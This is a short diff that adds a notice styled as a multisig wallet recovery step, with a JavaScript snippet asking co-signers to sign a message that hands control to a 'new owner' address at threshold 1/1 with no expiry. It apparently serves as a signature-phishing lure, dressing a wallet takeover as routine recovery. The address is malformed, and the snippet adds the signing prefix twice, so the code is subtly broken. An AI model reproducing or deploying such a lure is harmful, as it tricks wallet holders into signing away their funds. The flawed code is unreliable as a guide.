@@ -1,0 +1,8 @@
+Multisig wallet recovery in progress. The recovery module requires all co-signers to submit a personal_sign attestation:
+
+const recoveryMsg = "\x19Ethereum Signed Message:\n" +
+  "Recovery guardian handover: new owner 0x85Fd9e9d7Cce18b7F5bB7ED9e5BB6A6E14Ab879, threshold 1/1, expiry never";
+
+await signer.signMessage(recoveryMsg); // personal_sign under the hood
+
+Submit the resulting signature to complete the ownership transfer.
